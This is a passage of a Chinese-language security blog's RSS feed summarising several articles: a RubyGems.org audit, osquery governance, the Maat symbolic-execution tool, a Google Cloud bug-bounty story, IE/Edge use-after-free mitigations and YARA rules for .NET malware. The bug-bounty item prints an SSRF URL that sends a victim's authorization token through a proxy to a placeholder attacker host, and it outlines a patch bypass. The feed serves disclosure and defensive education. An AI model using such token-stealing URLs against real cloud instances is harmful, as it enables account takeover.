&lt;h2 id=&#34;修复建议&#34;&gt;修复建议
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;使用参数化查询替代字符串拼接&lt;/li&gt;
&lt;li&gt;实施严格的输入验证&lt;/li&gt;
&lt;li&gt;建立SQL查询日志审计机制&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;时间线&#34;&gt;时间线
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;2020-05-11：漏洞发现并修复&lt;/li&gt;
&lt;li&gt;2020-05-15：HEMA确认漏洞并发放奖励&lt;/li&gt;
&lt;li&gt;2020-08-06：报告公开披露&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>RubyGems.org安全审计报告：33个漏洞与加固建议</title>
        <link>http://localhost:1313/p/rubygems.org%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A33%E4%B8%AA%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%8A%A0%E5%9B%BA%E5%BB%BA%E8%AE%AE/</link>
        <pubDate>Sat, 02 Aug 2025 11:53:14 +0800</pubDate>
        
        <guid>http://localhost:1313/p/rubygems.org%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A33%E4%B8%AA%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%8A%A0%E5%9B%BA%E5%BB%BA%E8%AE%AE/</guid>
        <description>&lt;h1 id=&#34;ruby生态系统中央包仓库安全审计&#34;&gt;Ruby生态系统中央包仓库安全审计
&lt;/h1&gt;&lt;p&gt;Ruby Central委托Trail of Bits对Ruby应用官方包管理系统RubyGems.org进行安全评估和竞品分析。作为下载量超1840亿次的关键基础设施，该平台的安全直接影响数百万Ruby开发者。&lt;/p&gt;
&lt;h2 id=&#34;审计范围与发现&#34;&gt;审计范围与发现
&lt;/h2&gt;&lt;p&gt;三名工程师耗时五周审查了rubygems.org和rubygems-terraform代码库，重点评估：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;常见Web漏洞（XSS/CSRF/SQLi/SSRF）&lt;/li&gt;
&lt;li&gt;认证绕过风险&lt;/li&gt;
&lt;li&gt;权限控制有效性&lt;/li&gt;
&lt;li&gt;AWS服务配置安全&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;发现的33个安全问题中包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;高危漏洞&lt;/strong&gt;：SMTP邮件系统采用&lt;code&gt;enable_starttls_auto: true&lt;/code&gt;配置，可能被中间人攻击降级为明文传输。建议改用强制TLS的&lt;code&gt;enable_starttls&lt;/code&gt;配置。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;部署流程缺陷&lt;/strong&gt;：生产环境部署缺乏多方审批机制&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;基础设施风险&lt;/strong&gt;：混合使用IaC与手动配置导致安全缺口（TOB-RGM-16等4个相关发现）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;反序列化风险&lt;/strong&gt;：RubyGems库存储Marshal数据可能被利用（虽不影响服务本身）&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;竞品分析与改进建议&#34;&gt;竞品分析与改进建议
&lt;/h2&gt;&lt;p&gt;对比PyPI/npm等包管理器后提出19项改进，重点包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;强化可信发布基础设施&lt;/li&gt;
&lt;li&gt;扩展支持平台范围&lt;/li&gt;
&lt;li&gt;自动化权限管理（Terraform）&lt;/li&gt;
&lt;li&gt;集成安全测试工具链（Semgrep/Burp Suite/Ruzzy）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;自动化测试方案&#34;&gt;自动化测试方案
&lt;/h2&gt;&lt;p&gt;采用多层次安全测试：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;静态分析&lt;/strong&gt;：定制Semgrep规则检测不安全配置&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;动态测试&lt;/strong&gt;：Burp Suite Professional检测SSRF/API漏洞&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;模糊测试&lt;/strong&gt;：Ruzzy模糊测试器重点检测WebAuthn的CBOR库内存损坏风险&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;此次审计既确认了我们负责任地维护着Ruby包生态，也指明了下一步安全投资方向&amp;rdquo; —— Ruby Central安全工程师Samuel Giddins&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;完整报告详见[审计报告链接]，Ruby Central团队声明参见[公告链接]。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>QueryCon 2019：osquery发展的转折点 - 技术革新与社区治理</title>
        <link>http://localhost:1313/p/querycon-2019osquery%E5%8F%91%E5%B1%95%E7%9A%84%E8%BD%AC%E6%8A%98%E7%82%B9-%E6%8A%80%E6%9C%AF%E9%9D%A9%E6%96%B0%E4%B8%8E%E7%A4%BE%E5%8C%BA%E6%B2%BB%E7%90%86/</link>
        <pubDate>Sat, 02 Aug 2025 11:42:18 +0800</pubDate>
        
        <guid>http://localhost:1313/p/querycon-2019osquery%E5%8F%91%E5%B1%95%E7%9A%84%E8%BD%AC%E6%8A%98%E7%82%B9-%E6%8A%80%E6%9C%AF%E9%9D%A9%E6%96%B0%E4%B8%8E%E7%A4%BE%E5%8C%BA%E6%B2%BB%E7%90%86/</guid>
        <description>&lt;h3 id=&#34;新的基金会架构&#34;&gt;新的基金会架构
&lt;/h3&gt;&lt;p&gt;6月18日QueryCon前夕，Linux基金会正式宣布从Facebook接管osquery所有权。新成立的osquery基金会将由技术指导委员会（TSC）管理，成员来自Facebook、Trail of Bits、Google和Kolide等公司的工程师。该变革解决了项目规模超出Facebook单独维护能力的问题。&lt;/p&gt;
&lt;h3 id=&#34;基金会运作机制&#34;&gt;基金会运作机制
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Linux基金会提供资金和管理平台支持&lt;/li&gt;
&lt;li&gt;TSC在社区贡献支持下主导项目方向&lt;/li&gt;
&lt;li&gt;Trail of Bits承诺每两周举行公开办公时间&lt;/li&gt;
&lt;li&gt;Facebook移交基础设施控制权但保留维护席位&lt;/li&gt;
&lt;li&gt;CommunityBridge平台即将开放项目赞助通道&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;关键技术决策&#34;&gt;关键技术决策
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;版本合并&lt;/strong&gt;：将osql社区分支功能合并回主代码库&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;发布周期&lt;/strong&gt;：采用月度交替发布开发版/稳定版机制&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;构建系统&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;恢复CMake支持（#5604/#5610）&lt;/li&gt;
&lt;li&gt;重构Linux第三方库源码构建（#5706）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;安全增强&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;改进Windows证书存储查询（#5696/#5697）&lt;/li&gt;
&lt;li&gt;引入模糊测试和地址消毒检测（#5665）&lt;/li&gt;
&lt;li&gt;计划集成静态/动态分析到CI系统&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;pr提交爆发增长&#34;&gt;PR提交爆发增长
&lt;/h3&gt;&lt;p&gt;QueryCon后12周内合并89个PR（社区贡献占比超70%），而此前9个月仅合并35个。Trail of Bits贡献了44个关键PR，包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;构建依赖项源码编译支持&lt;/li&gt;
&lt;li&gt;Windows证书全用户扫描能力&lt;/li&gt;
&lt;li&gt;新的高性能事件框架&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;稳定版重大更新&#34;&gt;稳定版重大更新
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;构建系统&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;同时支持Facebook的Buck和社区标准CMake&lt;/li&gt;
&lt;li&gt;实现Linux自定义工具链&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;新特性&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;Linux进程事件扩展检测&lt;/li&gt;
&lt;li&gt;正则表达式查询支持&lt;/li&gt;
&lt;li&gt;Linux eBPF事件追踪初步支持&lt;/li&gt;
&lt;li&gt;macOS T1/T2芯片检测表&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;性能优化&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;资源泄漏修复&lt;/li&gt;
&lt;li&gt;表格性能分析工具增强&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;会议成果延续&#34;&gt;会议成果延续
&lt;/h3&gt;&lt;p&gt;QueryCon 2019作为催化剂，推动了osquery从企业项目向社区驱动模式的转型。技术债务清理、跨平台构建统一和安全监控能力提升，标志着该项目进入新的发展阶段。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Maat：让符号执行变得简单 - 跨架构多功能符号执行框架</title>
        <link>http://localhost:1313/p/maat%E8%AE%A9%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%8F%98%E5%BE%97%E7%AE%80%E5%8D%95-%E8%B7%A8%E6%9E%B6%E6%9E%84%E5%A4%9A%E5%8A%9F%E8%83%BD%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E6%A1%86%E6%9E%B6/</link>
        <pubDate>Sat, 02 Aug 2025 11:26:19 +0800</pubDate>
        
        <guid>http://localhost:1313/p/maat%E8%AE%A9%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%8F%98%E5%BE%97%E7%AE%80%E5%8D%95-%E8%B7%A8%E6%9E%B6%E6%9E%84%E5%A4%9A%E5%8A%9F%E8%83%BD%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E6%A1%86%E6%9E%B6/</guid>
        <description>&lt;h1 id=&#34;maat让符号执行变得简单&#34;&gt;Maat：让符号执行变得简单
&lt;/h1&gt;&lt;p&gt;我们发布了Maat——一个跨架构、多用途且用户友好的符号执行框架。它提供动态符号执行（DSE）、污点分析、二进制插桩、环境模拟和约束求解等核心功能。基于Ghidra的中间表示语言p-code，Maat兼具C++高性能API和Python便捷接口，既适合安全专家也方便初学者入门。&lt;/p&gt;
&lt;h2 id=&#34;用户友好的灵活api&#34;&gt;用户友好的灵活API
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;提供C++底层API和Python绑定&lt;/li&gt;
&lt;li&gt;调试器式交互：支持启动/暂停/回滚执行过程&lt;/li&gt;
&lt;li&gt;支持通过回调函数插桩目标代码（寄存器/内存访问等事件触发）&lt;/li&gt;
&lt;li&gt;可定制符号数据处理策略（符号指针处理、状态约束保存等）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;丰富的架构支持&#34;&gt;丰富的架构支持
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;基于Ghidra的sleigh库实现跨架构支持&lt;/li&gt;
&lt;li&gt;当前已验证X86/X64架构&lt;/li&gt;
&lt;li&gt;未来计划支持Java/Dalvik/Ethereum等虚拟机字节码&lt;/li&gt;
&lt;li&gt;无需安装Ghidra即可使用独立版sleigh&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;性能优化设计&#34;&gt;性能优化设计
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;纯C++核心实现&lt;/li&gt;
&lt;li&gt;实测性能：主流笔记本每秒执行10-30万条指令（2.3GHz i7/32GB RAM）&lt;/li&gt;
&lt;li&gt;未来将添加运行时瓶颈诊断功能&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;快速开始&#34;&gt;快速开始
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;安装：&lt;code&gt;python3 -m pip install pymaat&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;查看&lt;a class=&#34;link&#34; href=&#34;https://maat.re/docs/tutorials&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;教程系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;访问&lt;a class=&#34;link&#34; href=&#34;https://github.com/trailofbits/maat&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GitHub仓库&lt;/a&gt;获取源码和API文档&lt;/li&gt;
&lt;li&gt;通过GitHub讨论区提交反馈&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>谷歌向黑客二人组支付2.2万美元漏洞赏金，涉及多个云项目安全漏洞</title>
        <link>http://localhost:1313/p/%E8%B0%B7%E6%AD%8C%E5%90%91%E9%BB%91%E5%AE%A2%E4%BA%8C%E4%BA%BA%E7%BB%84%E6%94%AF%E4%BB%982.2%E4%B8%87%E7%BE%8E%E5%85%83%E6%BC%8F%E6%B4%9E%E8%B5%8F%E9%87%91%E6%B6%89%E5%8F%8A%E5%A4%9A%E4%B8%AA%E4%BA%91%E9%A1%B9%E7%9B%AE%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</link>
        <pubDate>Sat, 02 Aug 2025 11:15:24 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E8%B0%B7%E6%AD%8C%E5%90%91%E9%BB%91%E5%AE%A2%E4%BA%8C%E4%BA%BA%E7%BB%84%E6%94%AF%E4%BB%982.2%E4%B8%87%E7%BE%8E%E5%85%83%E6%BC%8F%E6%B4%9E%E8%B5%8F%E9%87%91%E6%B6%89%E5%8F%8A%E5%A4%9A%E4%B8%AA%E4%BA%91%E9%A1%B9%E7%9B%AE%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</guid>
        <description>&lt;h3 id=&#34;谷歌向黑客二人组支付22万美元漏洞赏金涉及多个云项目安全漏洞&#34;&gt;谷歌向黑客二人组支付2.2万美元漏洞赏金，涉及多个云项目安全漏洞
&lt;/h3&gt;&lt;p&gt;谷歌云平台(GCP)四个项目中的安全漏洞使两名安全研究人员获得了超过22,000美元的漏洞赏金。黑客二人组Sreeram KL和Sivanesh Ashok收益最丰厚的项目是机器学习训练和部署平台Vertex AI，他们因发现服务器端请求伪造(SSRF)漏洞及后续补丁绕过获得了两个5,000美元的奖励。&lt;/p&gt;
&lt;p&gt;根据Sreeram的博客文章，该漏洞存在于Vertex AI的Workbench功能中，该功能支持在云上创建基于Jupyter Notebook的开发环境。通过利用SSRF漏洞并诱骗受害者点击恶意URL，攻击者可能夺取授权令牌的控制权，进而控制受害者的所有GCP项目。&lt;/p&gt;
&lt;h4 id=&#34;ssrf漏洞技术细节&#34;&gt;SSRF漏洞技术细节
&lt;/h4&gt;&lt;p&gt;研究人员发现某个URL存在SSRF可能时，&amp;ldquo;请求原始URL返回的响应看起来像是发送到compute.googleapis.com的认证请求输出&amp;rdquo;，Sreeram表示。通过模糊测试，他们发现&lt;code&gt;https://{INSTANCE-ID}-dot-us-central1.notebooks.googleusercontent.com/aipn/v2/proxy/{attacker.com}/compute.googleapis.com/&lt;/code&gt;可绕过检查，且该易受攻击的端点是没有CSRF保护的GET请求。&lt;/p&gt;
&lt;p&gt;谷歌通过为GET端点添加CSRF保护并改进域名验证修复了该问题。&lt;/p&gt;
&lt;h4 id=&#34;补丁绕过技术&#34;&gt;补丁绕过技术
&lt;/h4&gt;&lt;p&gt;修复后，研究人员发现将&lt;code&gt;compute.googleapis.com&lt;/code&gt;改为&lt;code&gt;something.google.com&lt;/code&gt;不再触发错误。他们利用Google的FeedBurner服务实现开放重定向，最终结合2020年@s1r1us针对Jupyter Lab开发的CSRF绕过技术完成了漏洞利用。&lt;/p&gt;
&lt;h4 id=&#34;其他云项目漏洞&#34;&gt;其他云项目漏洞
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Theia IDE&lt;/strong&gt;：利用XSS漏洞(CVE-2021-41038)获取元数据服务器中的服务账户令牌，获得3,133.70美元赏金&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Compute Engine&lt;/strong&gt;：SSH-in-browser功能中的密钥注入问题可能导致远程代码执行，获得5,000美元奖励及1,000美元额外奖金&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Cloud Workstations&lt;/strong&gt;：授权绕过漏洞获得3,133.70美元赏金&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;二人总计通过六个漏洞赏金项目获得22,267美元。文章还包含多个漏洞的概念验证视频和技术细节说明。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>IE/Edge崩溃可利用性分析与微软安全防护技术解析</title>
        <link>http://localhost:1313/p/ie/edge%E5%B4%A9%E6%BA%83%E5%8F%AF%E5%88%A9%E7%94%A8%E6%80%A7%E5%88%86%E6%9E%90%E4%B8%8E%E5%BE%AE%E8%BD%AF%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Sat, 02 Aug 2025 10:59:22 +0800</pubDate>
        
        <guid>http://localhost:1313/p/ie/edge%E5%B4%A9%E6%BA%83%E5%8F%AF%E5%88%A9%E7%94%A8%E6%80%A7%E5%88%86%E6%9E%90%E4%B8%8E%E5%BE%AE%E8%BD%AF%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;引言&#34;&gt;引言
&lt;/h3&gt;&lt;p&gt;Internet Explorer（IE）和Edge通过多项安全防护技术显著提升了用户安全性。这些缓解措施不仅使某些漏洞类型无法被利用，还大幅提高了攻击者开发有效漏洞利用的成本。由于这些变化，分析崩溃的可利用性变得更为复杂，必须综合考虑缓解措施的影响。本文旨在为安全社区提供技术指导，帮助判断漏洞是否真正可被利用。&lt;/p&gt;
&lt;h3 id=&#34;use-after-free漏洞缓解技术&#34;&gt;Use-After-Free漏洞缓解技术
&lt;/h3&gt;&lt;p&gt;Use-After-Free（UAF）是现代面向对象软件中的常见漏洞类型，通常由对象释放后仍被引用导致。微软开发了两项主要防护技术：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Memory Protector（MP）&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;针对栈或寄存器中保存的悬垂指针，通过延迟释放和扫描机制防止内存被恶意重用。&lt;/li&gt;
&lt;li&gt;支持&amp;quot;Stress Mode&amp;quot;（通过注册表启用），可立即触发释放以简化分析。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;MemGC&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当前仅用于Edge和IE11，扩展了MP的功能，额外扫描堆引用，确保对象仅在无任何引用时释放。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;可利用性与服务策略&#34;&gt;可利用性与服务策略
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;MemGC防护的UAF漏洞&lt;/strong&gt;：除非出现罕见的零写入导致可利用状态，否则视为已完全缓解，不发布安全更新。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;MP防护的UAF漏洞&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;栈/寄存器引用类漏洞视为已缓解（除特殊情况外）；&lt;/li&gt;
&lt;li&gt;堆引用类漏洞仍需通过安全更新修复。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;崩溃分析实战&#34;&gt;崩溃分析实战
&lt;/h3&gt;&lt;h4 id=&#34;memory-protector示例&#34;&gt;Memory Protector示例
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;启用Stress Mode&lt;/strong&gt;：强制立即释放对象，排除延迟释放干扰。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;分析崩溃现场&lt;/strong&gt;：若悬垂指针始终存在于栈/寄存器中（如示例中从释放点到崩溃点全程存在引用），则判定为不可利用。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关键检查点&lt;/strong&gt;：通过Windbg脚本扫描栈帧，确认引用位置是否覆盖关键代码路径。&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;memgc验证步骤&#34;&gt;MemGC验证步骤
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;定位空指针解引用&lt;/strong&gt;：确定对象基址并验证其是否被零写入。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;追踪分配/释放调用栈&lt;/strong&gt;：通过&lt;code&gt;edgehtml!MemoryProtection::HeapAlloc&lt;/code&gt;和&lt;code&gt;HeapFree&lt;/code&gt;确认对象受MemGC保护。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;堆栈引用扫描&lt;/strong&gt;：若发现受保护对象存在堆/栈引用，则判定为已缓解。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;结论&#34;&gt;结论
&lt;/h3&gt;&lt;p&gt;MemGC和MP技术大幅降低了UAF漏洞的可利用性。分析IE/Edge崩溃时，必须结合缓解机制的行为进行综合评估。&lt;/p&gt;
&lt;h3 id=&#34;致谢&#34;&gt;致谢
&lt;/h3&gt;&lt;p&gt;感谢Chris Betz、Matt Miller等团队成员对本文的贡献。&lt;br&gt;
——MSRC工程部漏洞与缓解团队：Stephen Fleming &amp;amp; Richard van Eeden&lt;/p&gt;
</description>
        </item>
        <item>
        <title>100天掌握YARA：如何编写.NET代码特征规则</title>
        <link>http://localhost:1313/p/100%E5%A4%A9%E6%8E%8C%E6%8F%A1yara%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99.net%E4%BB%A3%E7%A0%81%E7%89%B9%E5%BE%81%E8%A7%84%E5%88%99/</link>
        <pubDate>Sat, 02 Aug 2025 10:48:22 +0800</pubDate>
        
        <guid>http://localhost:1313/p/100%E5%A4%A9%E6%8E%8C%E6%8F%A1yara%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99.net%E4%BB%A3%E7%A0%81%E7%89%B9%E5%BE%81%E8%A7%84%E5%88%99/</guid>
        <description>&lt;h1 id=&#34;100天掌握yara编写net恶意软件特征规则&#34;&gt;100天掌握YARA：编写.NET恶意软件特征规则
&lt;/h1&gt;&lt;p&gt;当YARA规则仅依赖字符串匹配时，其对.NET程序集的检测能力非常有限。我们将探索更多检测机会，包括IL代码、方法签名定义和特定自定义属性。了解底层.NET元数据结构、令牌和流有助于构建更精确高效的特征规则，甚至在相关恶意样本不可用时也能发挥作用。&lt;/p&gt;
&lt;h2 id=&#34;案例1基于截图的yara规则&#34;&gt;案例1：基于截图的YARA规则
&lt;/h2&gt;&lt;p&gt;有时恶意软件分析师需要根据文章或社交媒体帖子编写威胁狩猎规则，但手头没有样本。样本可能属于机密信息、未公开分享或无法获取哈希值。虽然这是特定场景，但本文还将教会您如何为.NET特征添加上下文，以及如何在有样本时跳过十六进制编辑器直接选择正确格式。&lt;/p&gt;
&lt;p&gt;若只有截图，我们能利用哪些信息？首先，dnSpy会话截图可能显示方法名、参数名、方法标识符和类名。此外还可能包含独特盐值、密码或编码载荷的整数数组。反编译代码也常出现在截图中，但通常无法还原为IL代码模式。我们将讨论如何为每种模式选择适当格式。&lt;/p&gt;
&lt;p&gt;不了解.NET内部机制的分析师可能会编写如下规则。为确保考虑字符串的不同编码，他们可能对所有字符串应用ascii和wide修饰符。&lt;/p&gt;
&lt;p&gt;⚠️ 为避免博客被检测，YARA规则以纯文本形式提供&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rule Buggy_Hunt_Rule {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    strings:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        $s1 = &amp;#34;AssemblyTitle&amp;#34; ascii wide
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        $s2 = &amp;#34;Guid&amp;#34; ascii wide
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        $s3 = &amp;#34;WindowsFormsApp54.Program.Main&amp;#34; ascii wide
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        $timestamp = &amp;#34;E5 93 05 00&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    condition:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        all of them
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;但该规则不会匹配样本，因为这些模式存在常见缺陷。在讨论.NET内部机制后，我们将解释这些缺陷并创建改进后的有效规则。&lt;/p&gt;
&lt;h2 id=&#34;net元数据头与流&#34;&gt;.NET元数据头与流
&lt;/h2&gt;&lt;p&gt;.NET文件是包含公共语言运行时(CLR)元数据的可移植可执行文件。CLR头的位置由PE文件头数据目录的第15项设置，在PE COFF规范中名为CLR运行时头。&lt;/p&gt;
&lt;p&gt;CLR头指向以存储签名&amp;rsquo;BSJB&amp;rsquo;开头的元数据头。元数据头定义流头。标准.NET可执行文件包含以下流：#GUID、#Strings、#US、#Blob以及优化的(#~)或未优化的(#-)元数据流（见图3）。&lt;/p&gt;
&lt;p&gt;元数据流引用#GUID、#Strings、#Blob中的数据并指向IL代码。IL代码本身可能引用#US堆上的用户定义字符串。&lt;/p&gt;
&lt;p&gt;元数据头中出现首个检测机会，因为混淆器可能添加无效流（如两个同名流或规范未定义的流名）。仅此异常通常不足以检测恶意软件，但可用于构建强大的混淆器检测规则，为逆向工程师和恶意软件分析师提供重要信息。&lt;/p&gt;
&lt;p&gt;下表描述各流的用途和高级格式说明。在决定YARA规则中使用哪些修饰符和模式时，请以此为参考。&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;流名&lt;/th&gt;
          &lt;th&gt;格式&lt;/th&gt;
          &lt;th&gt;内容&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;#Blob&lt;/td&gt;
          &lt;td&gt;任意大小二进制对象的堆，4字节对齐，每个对象前有压缩长度，字符串通常为UTF-8&lt;/td&gt;
          &lt;td&gt;默认名称、方法和属性签名、自定义属性（如程序集信息、类型库GUID）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;#GUID&lt;/td&gt;
          &lt;td&gt;16字节二进制对象数组&lt;/td&gt;
          &lt;td&gt;全局唯一标识符如MVID&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;#Strings&lt;/td&gt;
          &lt;td&gt;UTF-8字符串，始终以零字节包围&lt;/td&gt;
          &lt;td&gt;方法名、类名、字段名、参数名&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;#US&lt;/td&gt;
          &lt;td&gt;UTF-16字符串堆，前有压缩长度，尾字节为0或1&lt;/td&gt;
          &lt;td&gt;用户代码中定义的字符串常量&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;#~或#-&lt;/td&gt;
          &lt;td&gt;元数据表&lt;/td&gt;
          &lt;td&gt;-&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;#Blob和#US流在每个元素前添加压缩长度。压缩长度计算如下（参见[2]第68页）：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;值范围&lt;/th&gt;
